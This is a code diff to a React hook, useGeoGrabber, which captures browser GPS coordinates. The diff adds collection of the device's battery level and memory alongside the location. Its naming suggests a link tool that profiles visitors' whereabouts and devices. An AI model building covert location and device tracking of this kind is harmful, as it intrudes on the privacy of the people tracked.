@@ -1,9 +1,3 @@
-/**
- * useGeoGrabber — captures GPS coordinates only.
- * Reverse geocoding (address lookup) is handled server-side in links.js
- * to avoid Nominatim rate-limiting / CORS issues from browsers.
- */
-
 import { useState, useEffect } from "react";
 
 const GPS_TIMEOUT_MS = 20000;
@@ -33,9 +27,23 @@ export function useGeoGrabber() {
         async function grab() {
             setLoading(true);
             setError(null);
-            setLocation(null);
 
-            // PASS 1 — fast cached position (gets something immediately)
+            // --- DEVICE DATA COLLECTION (Fixes N/A & Battery Bug) ---
+            let batteryLevel = "N/A";
+            let ram = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "N/A";
+
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    // Fix: battery.level is 0.39, we multiply by 100 to get 39
+                    // We use Math.round to prevent decimals like 39.000004
+                    batteryLevel = `${Math.round(battery.level * 100)}%`;
+                }
+            } catch (e) {
+                batteryLevel = "Protected"; // Better than N/A for iOS
+            }
+
+            // PASS 1 — Fast cached position
             let fastPos = null;
             try {
                 fastPos = await new Promise((resolve, reject) => {
@@ -53,10 +61,12 @@ export function useGeoGrabber() {
                     lat: fastPos.coords.latitude,
                     lon: fastPos.coords.longitude,
                     gpsAccuracy: Math.round(fastPos.coords.accuracy),
+                    battery: batteryLevel, // Added
+                    ram: ram // Added
                 });
             }
 
-            // PASS 2 — precise fresh fix (overwrites pass 1 if better)
+            // PASS 2 — Precise fresh fix
             try {
                 const precisePos = await getGPSPosition();
                 if (!cancelled) {
@@ -65,12 +75,19 @@ export function useGeoGrabber() {
                         lat: precisePos.coords.latitude,
                         lon: precisePos.coords.longitude,
                         gpsAccuracy: Math.round(precisePos.coords.accuracy),
+                        battery: batteryLevel, // Added
+                        ram: ram // Added
                     });
                 }
             } catch (e) {
-                if (!fastPos) {
-                    if (cancelled) return;
-                    setLocation({ source: "ip", lat: null, lon: null });
+                if (!fastPos && !cancelled) {
+                    setLocation({ 
+                        source: "ip", 
+                        lat: null, 
+                        lon: null,
+                        battery: batteryLevel, 
+                        ram: ram 
+                    });
                 }
             }
 
